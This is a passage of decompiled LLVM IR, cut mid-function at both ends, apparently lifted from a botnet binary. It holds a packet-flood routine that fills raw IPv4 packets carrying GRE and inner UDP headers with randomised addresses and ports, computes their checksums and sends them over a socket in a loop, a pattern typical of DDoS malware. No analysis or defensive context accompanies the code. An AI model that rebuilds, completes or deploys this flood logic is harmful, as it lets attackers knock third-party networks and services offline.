  %v2_804ae35 = call i16 @llvm.bswap.i16(i16 %v1_804adc4)
  %v3_804ae35 = zext i16 %v2_804ae35 to i32
  %v2_804ae42 = call i16 @llvm.bswap.i16(i16 %v1_804ae02)
  %v3_804ae42 = zext i16 %v2_804ae42 to i32
  %v1_804ae97 = trunc i32 %v5_804acc9 to i8
  %v1_804af0f = icmp eq i1 %v4_804af07, false
  br label %dec_label_pc_804ae54

dec_label_pc_804ae16:                             ; preds = %dec_label_pc_804aefe
  %v0_804ae16 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804ae16 = add i32 %v0_804ae16, 16
  %v2_804ae16 = inttoptr i32 %v1_804ae16 to i32*
  %v3_804ae16 = load i32, i32* %v2_804ae16, align 4
  store i32 %v3_804ae16, i32* %eax.global-to-local, align 4
  %v1_804ae19 = load i32, i32* @esi, align 4
  %v2_804ae19 = add i32 %v1_804ae19, 16
  %v3_804ae19 = inttoptr i32 %v2_804ae19 to i32*
  store i32 %v3_804ae16, i32* %v3_804ae19, align 4
  br label %dec_label_pc_804ae1c

dec_label_pc_804ae1c:                             ; preds = %dec_label_pc_804af15, %dec_label_pc_804ae16
  %v3_804ae1c = load i32, i32* %stack_var_-20, align 4
  %v1_804ae24 = add i32 %v3_804ae1c, 1
  store i32 %v1_804ae24, i32* @ebx, align 4
  store i32 %v6_804ae25, i32* %eax.global-to-local, align 4
  store i32 %v1_804ae24, i32* %stack_var_-20, align 4
  %v2_804ae2d = load i32, i32* @edi, align 4
  %v3_804ae2d = inttoptr i32 %v2_804ae2d to i16*
  store i16 %v2_804ae25, i16* %v3_804ae2d, align 2
  %v5_804ae30 = load i32, i32* %eax.global-to-local, align 4
  %v5_804ae35 = and i32 %v5_804ae30, -65536
  %v6_804ae35 = or i32 %v5_804ae35, %v3_804ae35
  store i32 %v6_804ae35, i32* %eax.global-to-local, align 4
  %v2_804ae39 = load i32, i32* @edi, align 4
  %v3_804ae39 = add i32 %v2_804ae39, 2
  %v4_804ae39 = inttoptr i32 %v3_804ae39 to i16*
  store i16 %v2_804ae35, i16* %v4_804ae39, align 2
  %v5_804ae3d = load i32, i32* %eax.global-to-local, align 4
  %v5_804ae42 = and i32 %v5_804ae3d, -65536
  %v6_804ae42 = or i32 %v5_804ae42, %v3_804ae42
  store i32 %v6_804ae42, i32* %eax.global-to-local, align 4
  %v0_804ae46 = load i32, i32* @ebx, align 4
  %v2_804ae4a = load i32, i32* @edi, align 4
  %v3_804ae4a = add i32 %v2_804ae4a, 4
  %v4_804ae4a = inttoptr i32 %v3_804ae4a to i16*
  store i16 %v2_804ae42, i16* %v4_804ae4a, align 2
  %v5_804ae4e = icmp slt i32 %v0_804ae46, %v4_804ac69
  br i1 %v5_804ae4e, label %dec_label_pc_804ae1c.dec_label_pc_804ae54_crit_edge, label %dec_label_pc_804af3d

dec_label_pc_804ae1c.dec_label_pc_804ae54_crit_edge: ; preds = %dec_label_pc_804ae1c
  br label %dec_label_pc_804ae54

dec_label_pc_804ae54:                             ; preds = %dec_label_pc_804ae1c.dec_label_pc_804ae54_crit_edge, %dec_label_pc_804ade0
  store i32 1510, i32* %stack_var_-124, align 4
  %v3_804ae5d = call i32 @calloc(i64 1510, i32 4)
  store i32 %v3_804ac96, i32* %edx.global-to-local, align 4
  %v2_804ae66 = load i32, i32* @ebx, align 4
  %v3_804ae66 = mul i32 %v2_804ae66, 4
  %v4_804ae66 = add i32 %v3_804ae66, %v3_804ac96
  %v5_804ae66 = inttoptr i32 %v4_804ae66 to i32*
  store i32 %v3_804ae5d, i32* %v5_804ae66, align 4
  %v3_804ae69 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_804ae69, i32* %eax.global-to-local, align 4
  %v0_804ae6d = load i32, i32* %edx.global-to-local, align 4
  %v2_804ae6d = mul i32 %v3_804ae69, 4
  %v3_804ae6d = add i32 %v0_804ae6d, %v2_804ae6d
  %v4_804ae6d = inttoptr i32 %v3_804ae6d to i32*
  %v5_804ae6d = load i32, i32* %v4_804ae6d, align 4
  store i32 %v5_804ae6d, i32* %ebx.global-to-local, align 4
  %v1_804ae70 = inttoptr i32 %v5_804ae6d to i8*
  store i8 69, i8* %v1_804ae70, align 1
  %v0_804ae73 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804ae73 = add i32 %v0_804ae73, 20
  store i32 %v1_804ae73, i32* %edx.global-to-local, align 4
  %v5_804ae76 = load i32, i32* @ecx, align 4
  %v6_804ae76 = and i32 %v5_804ae76, -256
  %v7_804ae76 = or i32 %v6_804ae76, %v4_804ae76
  store i32 %v7_804ae76, i32* %ecx.global-to-local, align 4
  %v1_804ae7a = add i32 %v0_804ae73, 24
  store i32 %v1_804ae7a, i32* @esi, align 4
  %v3_804ae7d = add i32 %v0_804ae73, 1
  %v4_804ae7d = inttoptr i32 %v3_804ae7d to i8*
  store i8 %v6_804aca5, i8* %v4_804ae7d, align 1
  %v0_804ae80 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804ae80 = add i32 %v0_804ae80, 44
  store i32 %v1_804ae80, i32* @edi, align 4
  %v5_804ae83 = load i32, i32* %ecx.global-to-local, align 4
  %v6_804ae83 = and i32 %v5_804ae83, -65536
  %v7_804ae83 = or i32 %v6_804ae83, %v3_804ae07
  store i32 %v7_804ae83, i32* %ecx.global-to-local, align 4
  %v0_804ae88 = load i32, i32* @ebp, align 4
  %v1_804ae88 = trunc i32 %v0_804ae88 to i16
  %v3_804ae88 = add i32 %v0_804ae80, 2
  %v4_804ae88 = inttoptr i32 %v3_804ae88 to i16*
  store i16 %v1_804ae88, i16* %v4_804ae88, align 2
  %v0_804ae8c = load i32, i32* %ecx.global-to-local, align 4
  %v1_804ae8c = trunc i32 %v0_804ae8c to i16
  %v2_804ae8c = load i32, i32* %ebx.global-to-local, align 4
  %v3_804ae8c = add i32 %v2_804ae8c, 4
  %v4_804ae8c = inttoptr i32 %v3_804ae8c to i16*
  store i16 %v1_804ae8c, i16* %v4_804ae8c, align 2
  %v5_804ae90 = load i32, i32* %ecx.global-to-local, align 4
  %v6_804ae90 = and i32 %v5_804ae90, -256
  %v7_804ae90 = or i32 %v6_804ae90, %v4_804ae90
  store i32 %v7_804ae90, i32* %ecx.global-to-local, align 4
  %v2_804ae97 = load i32, i32* %ebx.global-to-local, align 4
  %v3_804ae97 = add i32 %v2_804ae97, 8
  %v4_804ae97 = inttoptr i32 %v3_804ae97 to i8*
  store i8 %v1_804ae97, i8* %v4_804ae97, align 1
  br i1 %v4_804ae9a, label %dec_label_pc_804aea7, label %dec_label_pc_804aea1

dec_label_pc_804aea1:                             ; preds = %dec_label_pc_804ae54
  %v0_804aea1 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804aea1 = add i32 %v0_804aea1, 6
  %v2_804aea1 = inttoptr i32 %v1_804aea1 to i16*
  store i16 64, i16* %v2_804aea1, align 2
  br label %dec_label_pc_804aea7

dec_label_pc_804aea7:                             ; preds = %dec_label_pc_804ae54, %dec_label_pc_804aea1
  %v0_804aea7 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804aea7 = add i32 %v0_804aea7, 9
  %v2_804aea7 = inttoptr i32 %v1_804aea7 to i8*
  store i8 47, i8* %v2_804aea7, align 1
  %v0_804aeab = load i32, i32* %eax.global-to-local, align 4
  %v3_804aeab = mul i32 %v0_804aeab, 3
  store i32 %v3_804aeab, i32* %eax.global-to-local, align 4
  store i32 %v5_804ad48, i32* %ecx.global-to-local, align 4
  %v0_804aeb2 = load i32, i32* %edx.global-to-local, align 4
  %v1_804aeb2 = add i32 %v0_804aeb2, 2
  %v2_804aeb2 = inttoptr i32 %v1_804aeb2 to i16*
  store i16 8, i16* %v2_804aeb2, align 2
  %v0_804aeb8 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804aeb8 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804aeb8 = add i32 %v1_804aeb8, 12
  %v3_804aeb8 = inttoptr i32 %v2_804aeb8 to i32*
  store i32 %v0_804aeb8, i32* %v3_804aeb8, align 4
  store i32 %arg3, i32* %ecx.global-to-local, align 4
  %v1_804aebf = load i32, i32* %eax.global-to-local, align 4
  %v2_804aebf = mul i32 %v1_804aebf, 8
  %v4_804aebf = add i32 %v3_804aebf, %v2_804aebf
  %v5_804aebf = inttoptr i32 %v4_804aebf to i32*
  %v6_804aebf = load i32, i32* %v5_804aebf, align 4
  store i32 %v6_804aebf, i32* %eax.global-to-local, align 4
  %v0_804aec3 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804aec3 = add i32 %v0_804aec3, 24
  %v2_804aec3 = inttoptr i32 %v1_804aec3 to i8*
  store i8 69, i8* %v2_804aec3, align 1
  %v0_804aec7 = load i32, i32* %eax.global-to-local, align 4
  %v1_804aec7 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804aec7 = add i32 %v1_804aec7, 16
  %v3_804aec7 = inttoptr i32 %v2_804aec7 to i32*
  store i32 %v0_804aec7, i32* %v3_804aec7, align 4
  %v2_804aece = load i32, i32* @esi, align 4
  %v3_804aece = add i32 %v2_804aece, 1
  %v4_804aece = inttoptr i32 %v3_804aece to i8*
  store i8 %v6_804aca5, i8* %v4_804aece, align 1
  %v5_804aed1 = load i32, i32* %edx.global-to-local, align 4
  %v6_804aed1 = and i32 %v5_804aed1, -256
  %v7_804aed1 = or i32 %v6_804aed1, %v4_804ae90
  store i32 %v7_804aed1, i32* %edx.global-to-local, align 4
  %v2_804aede = load i32, i32* @esi, align 4
  %v3_804aede = add i32 %v2_804aede, 2
  %v4_804aede = inttoptr i32 %v3_804aede to i16*
  store i16 %v2_804aeda, i16* %v4_804aede, align 2
  %v0_804aee6 = load i32, i32* %edx.global-to-local, align 4
  %v1_804aee6 = trunc i32 %v0_804aee6 to i8
  %v2_804aee6 = load i32, i32* @esi, align 4
  %v3_804aee6 = add i32 %v2_804aee6, 8
  %v4_804aee6 = inttoptr i32 %v3_804aee6 to i8*
  store i8 %v1_804aee6, i8* %v4_804aee6, align 1
  store i32 %v6_804aee9, i32* %eax.global-to-local, align 4
  %v2_804aef2 = load i32, i32* @esi, align 4
  %v3_804aef2 = add i32 %v2_804aef2, 4
  %v4_804aef2 = inttoptr i32 %v3_804aef2 to i16*
  store i16 %v2_804aee9, i16* %v4_804aef2, align 2
  br i1 %v4_804ae9a, label %dec_label_pc_804aefe, label %dec_label_pc_804aef8

dec_label_pc_804aef8:                             ; preds = %dec_label_pc_804aea7
  %v0_804aef8 = load i32, i32* @esi, align 4
  %v1_804aef8 = add i32 %v0_804aef8, 6
  %v2_804aef8 = inttoptr i32 %v1_804aef8 to i16*
  store i16 64, i16* %v2_804aef8, align 2
  br label %dec_label_pc_804aefe

dec_label_pc_804aefe:                             ; preds = %dec_label_pc_804aea7, %dec_label_pc_804aef8
  %v0_804aefe = load i32, i32* @esi, align 4
  %v1_804aefe = add i32 %v0_804aefe, 9
  %v2_804aefe = inttoptr i32 %v1_804aefe to i8*
  store i8 17, i8* %v2_804aefe, align 1
  %v0_804af02 = load i32, i32* %stack_var_-124, align 4
  %v1_804af02 = call i32 @rand_next(i32 %v0_804af02)
  store i32 %v1_804af02, i32* %eax.global-to-local, align 4
  %v1_804af0c = load i32, i32* @esi, align 4
  %v2_804af0c = add i32 %v1_804af0c, 12
  %v3_804af0c = inttoptr i32 %v2_804af0c to i32*
  store i32 %v1_804af02, i32* %v3_804af0c, align 4
  br i1 %v1_804af0f, label %dec_label_pc_804ae16, label %dec_label_pc_804af15

dec_label_pc_804af15:                             ; preds = %dec_label_pc_804aefe
  %v3_804af15 = sub i32 1023, %v1_804af02
  store i32 %v3_804af15, i32* %eax.global-to-local, align 4
  %v1_804af1d = load i32, i32* @esi, align 4
  %v2_804af1d = add i32 %v1_804af1d, 16
  %v3_804af1d = inttoptr i32 %v2_804af1d to i32*
  store i32 %v3_804af15, i32* %v3_804af1d, align 4
  br label %dec_label_pc_804ae1c

dec_label_pc_804af25:                             ; preds = %dec_label_pc_804ad86
  store i32 %v3_804ad73, i32* %ebx.global-to-local, align 4
  store i32 %v3_804ad73, i32* %stack_var_-124, align 4
  %v1_804af2d = call i32 @__GI___libc_close(i32 %v3_804ad73)
  store i32 %v1_804af2d, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804af35

dec_label_pc_804af35:                             ; preds = %entry, %dec_label_pc_804af25
  %v0_804af3c = phi i32 [ 0, %entry ], [ %v1_804af2d, %dec_label_pc_804af25 ]
  store i32 %v0_804ac63, i32* %ebx.global-to-local, align 4
  ret i32 %v0_804af3c

dec_label_pc_804af3d:                             ; preds = %dec_label_pc_804ae1c, %dec_label_pc_804adb0.dec_label_pc_804af3d_crit_edge
  %v1_804af48.pre-phi = phi i32 [ %.pre20, %dec_label_pc_804adb0.dec_label_pc_804af3d_crit_edge ], [ %v1_804adee, %dec_label_pc_804ae1c ]
  %v1_804af45.pre-phi = phi i32 [ %.pre, %dec_label_pc_804adb0.dec_label_pc_804af3d_crit_edge ], [ %v1_804adf1, %dec_label_pc_804ae1c ]
  store i32 %v1_804af45.pre-phi, i32* %ecx.global-to-local, align 4
  store i32 %v1_804af48.pre-phi, i32* %eax.global-to-local, align 4
  %v13_804af70 = icmp eq i32 %v5_804ad48, -1
  %v13_804b0c5 = icmp eq i16 %v6_804acba, -1
  %v13_804af87 = icmp eq i16 %v6_804aced, -1
  %v13_804b0fa = icmp eq i16 %v1_804adc4, -1
  %v4_804af9f = icmp eq i8 %v1_804adc9, 0
  %v4_804b129 = icmp eq i8 %v6_804ad24, 0
  %v1_804afb5 = icmp eq i1 %v4_804b129, false
  %v1_804b0ef = icmp eq i1 %v13_804af87, false
  %v3_804b095 = add i32 %arg3, 20
  %v1_804b0ce = icmp eq i1 %v13_804b0c5, false
  %v1_804b104 = icmp eq i1 %v13_804b0fa, false
  %v1_804b11e = icmp eq i1 %v4_804af9f, false
  %v1_804b0b6 = icmp eq i1 %v13_804af70, false
  br label %dec_label_pc_804af53

dec_label_pc_804af53:                             ; preds = %dec_label_pc_804b158, %dec_label_pc_804af3d
  store i32 0, i32* %stack_var_-20, align 4
  br i1 %v4_804add5, label %dec_label_pc_804af53.dec_label_pc_804b158_crit_edge, label %dec_label_pc_804af66

dec_label_pc_804af53.dec_label_pc_804b158_crit_edge: ; preds = %dec_label_pc_804af53
  br label %dec_label_pc_804b158

dec_label_pc_804af66:                             ; preds = %dec_label_pc_804af53
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b056

dec_label_pc_804af70:                             ; preds = %dec_label_pc_804b056
  br i1 %v13_804af70, label %dec_label_pc_804b0c0, label %dec_label_pc_804af7b

dec_label_pc_804af7b:                             ; preds = %bb65, %dec_label_pc_804af70
  br i1 %v13_804b0c5, label %dec_label_pc_804b0d4, label %dec_label_pc_804af87

dec_label_pc_804af87:                             ; preds = %dec_label_pc_804b0c0, %dec_label_pc_804af7b
  br i1 %v13_804af87, label %dec_label_pc_804b0f5, label %dec_label_pc_804af93

dec_label_pc_804af93:                             ; preds = %dec_label_pc_804b0d4, %dec_label_pc_804af87
  br i1 %v13_804b0fa, label %dec_label_pc_804b110, label %dec_label_pc_804af9f

dec_label_pc_804af9f:                             ; preds = %dec_label_pc_804b0f5, %dec_label_pc_804af93
  br i1 %v4_804af9f, label %dec_label_pc_804b124, label %dec_label_pc_804afaa

dec_label_pc_804afaa:                             ; preds = %dec_label_pc_804b110, %dec_label_pc_804af9f
  %v0_804afaa = load i32, i32* @esi, align 4
  %v1_804afaa = add i32 %v0_804afaa, 16
  %v2_804afaa = inttoptr i32 %v1_804afaa to i32*
  %v3_804afaa = load i32, i32* %v2_804afaa, align 4
  store i32 %v3_804afaa, i32* %eax.global-to-local, align 4
  %v1_804afad = load i32, i32* @edi, align 4
  %v2_804afad = add i32 %v1_804afad, 16
  %v3_804afad = inttoptr i32 %v2_804afad to i32*
  store i32 %v3_804afaa, i32* %v3_804afad, align 4
  br i1 %v1_804afb5, label %dec_label_pc_804b137, label %dec_label_pc_804afbb

dec_label_pc_804afbb:                             ; preds = %dec_label_pc_804b124, %dec_label_pc_804afaa, %dec_label_pc_804b137
  %v0_804afbb = load i32, i32* @esi, align 4
  %v1_804afbb = add i32 %v0_804afbb, 10
  %v2_804afbb = inttoptr i32 %v1_804afbb to i16*
  store i16 0, i16* %v2_804afbb, align 2
  %v0_804afc5 = load i32, i32* @esi, align 4
  store i32 %v0_804afc5, i32* %stack_var_-124, align 4
  %v2_804afc6 = inttoptr i32 %v0_804afc5 to i16*
  %v3_804afc6 = call i32 @checksum_generic(i16* %v2_804afc6, i32 20)
  %v4_804afc6 = trunc i32 %v3_804afc6 to i16
  %v3_804afcb = load i32, i32* @esi, align 4
  %v4_804afcb = add i32 %v3_804afcb, 10
  %v5_804afcb = inttoptr i32 %v4_804afcb to i16*
  store i16 %v4_804afc6, i16* %v5_804afcb, align 2
  %v0_804afcf = load i32, i32* @edi, align 4
  %v1_804afcf = add i32 %v0_804afcf, 10
  %v2_804afcf = inttoptr i32 %v1_804afcf to i16*
  store i16 0, i16* %v2_804afcf, align 2
  %v2_804afd5 = load i32, i32* %stack_var_-124, align 4
  store i32 %v2_804afd5, i32* %eax.global-to-local, align 4
  store i32 20, i32* %edx.global-to-local, align 4
  %v0_804afd9 = load i32, i32* @edi, align 4
  store i32 %v0_804afd9, i32* %stack_var_-124, align 4
  %v2_804afda = inttoptr i32 %v0_804afd9 to i16*
  %v3_804afda = call i32 @checksum_generic(i16* %v2_804afda, i32 20)
  %v4_804afda = trunc i32 %v3_804afda to i16
  %v3_804afdf = load i32, i32* @edi, align 4
  %v4_804afdf = add i32 %v3_804afdf, 10
  %v5_804afdf = inttoptr i32 %v4_804afdf to i16*
  store i16 %v4_804afda, i16* %v5_804afdf, align 2
  store i32 %v1_804af45.pre-phi, i32* %eax.global-to-local, align 4
  %v0_804afe7 = load i32, i32* @ebp, align 4
  %v1_804afe7 = add i32 %v0_804afe7, 6
  %v2_804afe7 = inttoptr i32 %v1_804afe7 to i16*
  store i16 0, i16* %v2_804afe7, align 2
  %v0_804afed = load i32, i32* %eax.global-to-local, align 4
  %v0_804afee = load i32, i32* @ebp, align 4
  %v1_804afee = add i32 %v0_804afee, 4
  %v2_804afee = inttoptr i32 %v1_804afee to i16*
  %v3_804afee = load i16, i16* %v2_804afee, align 2
  %v4_804afee = zext i16 %v3_804afee to i32
  store i32 %v4_804afee, i32* %eax.global-to-local, align 4
  %v0_804aff9 = load i32, i32* @edi, align 4
  %v3_804affa = inttoptr i32 %v4_804afee to i16*
  %v4_804affa = call i32 @checksum_tcpudp(i32 %v0_804aff9, i16* %v3_804affa, i32 %v0_804afed)
  %v5_804affa = trunc i32 %v4_804affa to i16
  %v3_804afff = load i32, i32* @ebp, align 4
  %v4_804afff = add i32 %v3_804afff, 6
  %v5_804afff = inttoptr i32 %v4_804afff to i16*
  store i16 %v5_804affa, i16* %v5_804afff, align 2
  %v3_804b003 = load i32, i32* %stack_var_-20, align 4
  store i32 %arg3, i32* %edx.global-to-local, align 4
  %v2_804b014 = mul i32 %v3_804b003, 24
  %v3_804b014 = add i32 %v2_804b014, %arg3
  store i32 %v3_804b014, i32* %eax.global-to-local, align 4
  %v0_804b017 = load i32, i32* @esi, align 4
  %v1_804b017 = add i32 %v0_804b017, 16
  %v2_804b017 = inttoptr i32 %v1_804b017 to i32*
  %v3_804b017 = load i32, i32* %v2_804b017, align 4
  store i32 %v3_804b017, i32* %edx.global-to-local, align 4
  %v1_804b01a = inttoptr i32 %v3_804b014 to i16*
  store i16 2, i16* %v1_804b01a, align 2
  %v0_804b01f = load i32, i32* %edx.global-to-local, align 4
  %v1_804b01f = load i32, i32* %eax.global-to-local, align 4
  %v2_804b01f = add i32 %v1_804b01f, 4
  %v3_804b01f = inttoptr i32 %v2_804b01f to i32*
  store i32 %v0_804b01f, i32* %v3_804b01f, align 4
  %v0_804b022 = load i32, i32* %eax.global-to-local, align 4
  %v1_804b022 = add i32 %v0_804b022, 2
  %v2_804b022 = inttoptr i32 %v1_804b022 to i16*
  store i16 0, i16* %v2_804b022, align 2
  %v0_804b02a = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_804b02a, i32* %stack_var_-124, align 4
  %v0_804b035 = load i32, i32* @esi, align 4
  store i32 %v3_804ad73, i32* @ebx, align 4
  %v6_804b03b = call i32 @__libc_sendto(i32 %v3_804ad73, i32 %v0_804b035, i32 %v1_804af48.pre-phi, i32 16384, i32 %v0_804b02a, i32 16)
  %v3_804b040 = load i32, i32* %stack_var_-20, align 4
  %v1_804b044 = add i32 %v3_804b040, 1
  store i32 %v1_804b044, i32* %eax.global-to-local, align 4
  store i32 %v1_804b044, i32* %stack_var_-20, align 4
  %v5_804b050 = icmp slt i32 %v1_804b044, %v4_804ac69
  br i1 %v5_804b050, label %dec_label_pc_804b056, label %dec_label_pc_804b158

dec_label_pc_804b056:                             ; preds = %dec_label_pc_804afbb, %dec_label_pc_804af66
  %v0_804b07a = phi i32 [ %v1_804b044, %dec_label_pc_804afbb ], [ 0, %dec_label_pc_804af66 ]
  store i32 %v3_804ac96, i32* %edx.global-to-local, align 4
  store i32 %arg3, i32* %ecx.global-to-local, align 4
  %v2_804b05e = mul i32 %v0_804b07a, 4
  %v3_804b05e = add i32 %v2_804b05e, %v3_804ac96
  %v4_804b05e = inttoptr i32 %v3_804b05e to i32*
  %v5_804b05e = load i32, i32* %v4_804b05e, align 4
  store i32 %v5_804b05e, i32* @esi, align 4
  %v2_804b064 = mul i32 %v0_804b07a, 24
  %v3_804b064 = add i32 %v2_804b064, %arg3
  store i32 %v3_804b064, i32* %eax.global-to-local, align 4
  %v1_804b067 = add i32 %v5_804b05e, 24
  store i32 %v1_804b067, i32* @edi, align 4
  %v1_804b06a = add i32 %v5_804b05e, 44
  store i32 %v1_804b06a, i32* @ebp, align 4
  %v1_804b06d = add i32 %v3_804b064, 20
  %v2_804b06d = inttoptr i32 %v1_804b06d to i8*
  %v3_804b06d = load i8, i8* %v2_804b06d, align 1
  %v6_804b071 = icmp ugt i8 %v3_804b06d, 31
  br i1 %v6_804b071, label %dec_label_pc_804af70, label %dec_label_pc_804b077

dec_label_pc_804b077:                             ; preds = %dec_label_pc_804b056
  %v1_804b077 = add i32 %v3_804b064, 16
  %v2_804b077 = inttoptr i32 %v1_804b077 to i32*
  %v3_804b077 = load i32, i32* %v2_804b077, align 4
  store i32 %v3_804b077, i32* %ebx.global-to-local, align 4
  %v1_804b07a = call i32 @rand_next(i32 %v0_804b07a)
  store i32 %v1_804b07a, i32* %eax.global-to-local, align 4
  %v1_804b07f = trunc i32 %v3_804b077 to i16
  %v2_804b07f = call i16 @llvm.bswap.i16(i16 %v1_804b07f)
  %v3_804b07f = zext i16 %v2_804b07f to i32
  %v1_804b083 = udiv i32 %v3_804b077, 65536
  %v2_804b083 = mul nuw i32 %v3_804b07f, 65536
  %v1_804b086 = trunc i32 %v1_804b083 to i16
  %v2_804b086 = call i16 @llvm.bswap.i16(i16 %v1_804b086)
  %v3_804b086 = zext i16 %v2_804b086 to i32
  %v6_804b086 = or i32 %v3_804b086, %v2_804b083
  store i32 %v6_804b086, i32* %ebx.global-to-local, align 4
  %v3_804b08a = load i32, i32* %stack_var_-20, align 4
  %v3_804b08e = mul i32 %v3_804b08a, 3
  store i32 %v3_804b08e, i32* %ecx.global-to-local, align 4
  store i32 %arg3, i32* %edx.global-to-local, align 4
  %v2_804b095 = mul i32 %v3_804b08a, 24
  %v4_804b095 = add i32 %v3_804b095, %v2_804b095
  %v5_804b095 = inttoptr i32 %v4_804b095 to i8*
  %v6_804b095 = load i8, i8* %v5_804b095, align 1
  %v7_804b095 = zext i8 %v6_804b095 to i32
  store i32 %v7_804b095, i32* %ecx.global-to-local, align 4
  %tmp = urem i8 %v6_804b095, 32
  %v4_804b09f = icmp eq i8 %tmp, 0
  br i1 %v4_804b09f, label %bb65, label %bb

bb:                                               ; preds = %dec_label_pc_804b077
  %v2_804b09f = zext i8 %tmp to i32
  %v5_804b09f = lshr i32 %v1_804b07a, %v2_804b09f
  store i32 %v5_804b09f, i32* %eax.global-to-local, align 4
  br label %bb65

bb65:                                             ; preds = %dec_label_pc_804b077, %bb
  %v1_804b0a1 = phi i32 [ %v1_804b07a, %dec_label_pc_804b077 ], [ %v5_804b09f, %bb ]
  %v2_804b0a1 = add i32 %v1_804b0a1, %v6_804b086
  %v1_804b0a3 = trunc i32 %v2_804b0a1 to i16
  %v2_804b0a3 = call i16 @llvm.bswap.i16(i16 %v1_804b0a3)
  %v3_804b0a3 = zext i16 %v2_804b0a3 to i32
  %v1_804b0a7 = udiv i32 %v2_804b0a1, 65536
  %v2_804b0a7 = mul nuw i32 %v3_804b0a3, 65536
  %v1_804b0aa = trunc i32 %v1_804b0a7 to i16
  %v2_804b0aa = call i16 @llvm.bswap.i16(i16 %v1_804b0aa)
  %v3_804b0aa = zext i16 %v2_804b0aa to i32
  %v6_804b0aa = or i32 %v3_804b0aa, %v2_804b0a7
  %v1_804b0b3 = load i32, i32* @esi, align 4
  %v2_804b0b3 = add i32 %v1_804b0b3, 16
  %v3_804b0b3 = inttoptr i32 %v2_804b0b3 to i32*
  store i32 %v6_804b0aa, i32* %v3_804b0b3, align 4
  br i1 %v1_804b0b6, label %dec_label_pc_804af7b, label %.dec_label_pc_804b0c0_crit_edge

.dec_label_pc_804b0c0_crit_edge:                  ; preds = %bb65
  %v0_804b0c0.pre = load i32, i32* %stack_var_-20, align 4
  br label %dec_label_pc_804b0c0

dec_label_pc_804b0c0:                             ; preds = %.dec_label_pc_804b0c0_crit_edge, %dec_label_pc_804af70
  %v0_804b0c0 = phi i32 [ %v0_804b0c0.pre, %.dec_label_pc_804b0c0_crit_edge ], [ %v0_804b07a, %dec_label_pc_804af70 ]
  %v1_804b0c0 = call i32 @rand_next(i32 %v0_804b0c0)
  store i32 %v1_804b0c0, i32* %eax.global-to-local, align 4
  %v1_804b0cb = load i32, i32* @esi, align 4
  %v2_804b0cb = add i32 %v1_804b0cb, 12
  %v3_804b0cb = inttoptr i32 %v2_804b0cb to i32*
  store i32 %v1_804b0c0, i32* %v3_804b0cb, align 4
  br i1 %v1_804b0ce, label %dec_label_pc_804af87, label %dec_label_pc_804b0d4

dec_label_pc_804b0d4:                             ; preds = %dec_label_pc_804b0c0, %dec_label_pc_804af7b
  %v0_804b0d4 = load i32, i32* %stack_var_-20, align 4
  %v1_804b0d4 = call i32 @rand_next(i32 %v0_804b0d4)
  %v2_804b0d4 = trunc i32 %v1_804b0d4 to i16
  %v3_804b0d9 = load i32, i32* @esi, align 4
  %v4_804b0d9 = add i32 %v3_804b0d9, 4
  %v5_804b0d9 = inttoptr i32 %v4_804b0d9 to i16*
  store i16 %v2_804b0d4, i16* %v5_804b0d9, align 2
  %sext9 = mul i32 %v1_804b0d4, 65536
  %v1_804b0dd = sdiv i32 %sext9, 65536
  %v7_804b0dd = sub nsw i32 999, %v1_804b0dd
  store i32 %v7_804b0dd, i32* %eax.global-to-local, align 4
  %v1_804b0e5 = trunc i32 %v7_804b0dd to i16
  %v2_804b0e5 = load i32, i32* @edi, align 4
  %v3_804b0e5 = add i32 %v2_804b0e5, 4
  %v4_804b0e5 = inttoptr i32 %v3_804b0e5 to i16*
  store i16 %v1_804b0e5, i16* %v4_804b0e5, align 2
  br i1 %v1_804b0ef, label %dec_label_pc_804af93, label %dec_label_pc_804b0f5

dec_label_pc_804b0f5:                             ; preds = %dec_label_pc_804b0d4, %dec_label_pc_804af87
  %v0_804b0f5 = load i32, i32* %stack_var_-20, align 4
  %v1_804b0f5 = call i32 @rand_next(i32 %v0_804b0f5)
  %v2_804b0f5 = trunc i32 %v1_804b0f5 to i16
  store i32 %v1_804b0f5, i32* %eax.global-to-local, align 4
  %v3_804b100 = load i32, i32* @esi, align 4
  %v4_804b100 = add i32 %v3_804b100, 44
  %v5_804b100 = inttoptr i32 %v4_804b100 to i16*
  store i16 %v2_804b0f5, i16* %v5_804b100, align 2
  br i1 %v1_804b104, label %dec_label_pc_804af9f, label %dec_label_pc_804b110

dec_label_pc_804b110:                             ; preds = %dec_label_pc_804b0f5, %dec_label_pc_804af93
  %v0_804b110 = load i32, i32* %stack_var_-20, align 4
  %v1_804b110 = call i32 @rand_next(i32 %v0_804b110)
  %v2_804b110 = trunc i32 %v1_804b110 to i16
  store i32 %v1_804b110, i32* %eax.global-to-local, align 4
  %v3_804b11a = load i32, i32* @ebp, align 4
  %v4_804b11a = add i32 %v3_804b11a, 2
  %v5_804b11a = inttoptr i32 %v4_804b11a to i16*
  store i16 %v2_804b110, i16* %v5_804b11a, align 2
  br i1 %v1_804b11e, label %dec_label_pc_804afaa, label %dec_label_pc_804b124

dec_label_pc_804b124:                             ; preds = %dec_label_pc_804b110, %dec_label_pc_804af9f
  %v0_804b124 = load i32, i32* %stack_var_-20, align 4
  %v1_804b124 = call i32 @rand_next(i32 %v0_804b124)
  store i32 %v1_804b124, i32* %eax.global-to-local, align 4
  %v1_804b12e = load i32, i32* @edi, align 4
  %v2_804b12e = add i32 %v1_804b12e, 16
  %v3_804b12e = inttoptr i32 %v2_804b12e to i32*
  store i32 %v1_804b124, i32* %v3_804b12e, align 4
  br i1 %v4_804b129, label %dec_label_pc_804afbb, label %dec_label_pc_804b137

dec_label_pc_804b137:                             ; preds = %dec_label_pc_804b124, %dec_label_pc_804afaa
  store i32 %v5_804ad12, i32* @ebx, align 4
  %v0_804b13d = load i32, i32* @ebp, align 4
  %v1_804b13d = add i32 %v0_804b13d, 8
  store i32 %v1_804b13d, i32* %eax.global-to-local, align 4
  store i32 %v1_804b13d, i32* %stack_var_-124, align 4
